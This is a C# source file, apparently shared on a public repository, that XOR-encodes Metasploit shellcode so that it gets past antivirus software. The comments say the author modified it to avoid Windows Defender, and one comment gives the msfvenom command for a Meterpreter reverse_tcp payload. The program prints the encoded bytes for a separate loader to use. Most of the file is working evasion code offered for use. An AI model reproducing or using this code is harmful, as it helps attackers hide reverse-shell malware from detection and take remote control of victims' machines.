//This code is used to XOR your ShellCode to be able to bypass the AntiVirus, it was driven from here :
//https://haxtivitiez.wordpress.com/2019/10/02/writing-backdoor-payloads-with-c-part-4-shellcode-obfuscation/ , These Guys are amazing but the Process Injection ,,
//didn't work out for me so i had to modify it a little bit to avoid getting caught by the AntiVirus(Windows Defender),And Successfully bypassed :-p 
//this code only gets out XORED Shell Code, to be used in another code and decrypted to do the function you want , keep learning <3 

using System;
using System.IO;
using System.Text;


namespace EncryptXOR
{
    class Program
    {
        private static byte[] xor(byte[] cipher, byte[] key)
        {

            byte[] xored = new byte[cipher.Length];

            for (int i = 0; i < cipher.Length; i++)
            {
                xored[i] = (byte)(cipher[i] ^ key[i % key.Length]);
            }

            return xored;
        }

        static void Main()
        {
        
        //change the Below Line with your own password
            string key = "ABCDE";
        //this shellcode i gained using : msfvneom -p windows/x64/meterpreter/reverse_tcp LHOST=<your LHOST> LPORT=<your LPORT> -f csharp
            byte[] shellcode = new byte[0] {//your-shellcode-here from metasploit };

            byte[] xorshellcode;

            xorshellcode = xor(shellcode, Encoding.ASCII.GetBytes(key));
            StringBuilder newshellcode = new StringBuilder();
            newshellcode.Append("byte[] shellcode = new byte[");
            newshellcode.Append(xorshellcode.Length);
            newshellcode.Append("] { ");
            for (int i = 0; i < xorshellcode.Length; i++)
            {
                newshellcode.Append("0x");
                newshellcode.AppendFormat("{0:x2}", xorshellcode[i]);
                if (i < xorshellcode.Length - 1)
                {
                    newshellcode.Append(", ");
                }
            }

            newshellcode.Append(" };");
            Console.WriteLine(newshellcode.ToString());


            return;
        }
    }

}
    




